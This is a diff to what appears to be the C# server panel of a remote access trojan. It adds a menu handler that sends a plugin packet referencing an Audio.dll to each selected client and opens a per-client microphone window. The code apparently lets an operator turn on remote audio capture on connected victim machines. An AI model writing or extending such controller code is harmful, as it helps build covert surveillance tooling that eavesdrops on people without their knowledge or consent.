@@ -622,7 +622,39 @@ namespace Server
             }
 
         }
+        private void microphoneToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            {
+                try
+                {
+                    MsgPack msgpack = new MsgPack();
+                    msgpack.ForcePathObject("Packet").AsString = "plugin";
+                    msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\Audio.dll"));
 
+                    foreach (Clients client in GetSelectedClients())
+                    {
+                        FormMicrophone mic = (FormMicrophone)Application.OpenForms["audio : " + client.ID];
+                        if (mic == null)
+                        {
+                            mic = new FormMicrophone
+                            {
+                                Name = "audio : " + client.ID,
+                                Text = "audio : " + client.ID,
+                                F = this,
+                                ParentClient = client
+                            };
+                            mic.Show();
+                            ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
+                        }
+                    }
+                }
+                catch (Exception ex)
+                {
+                    MessageBox.Show(ex.Message);
+                    return;
+                }
+            }
+        }
 
         #endregion
 
@@ -1771,9 +1803,9 @@ namespace Server
 
         #endregion
 
-
         [DllImport("uxtheme", CharSet = CharSet.Unicode)]
         public static extern int SetWindowTheme(IntPtr hWnd, string textSubAppName, string textSubIdList);
+
 
     }
 }
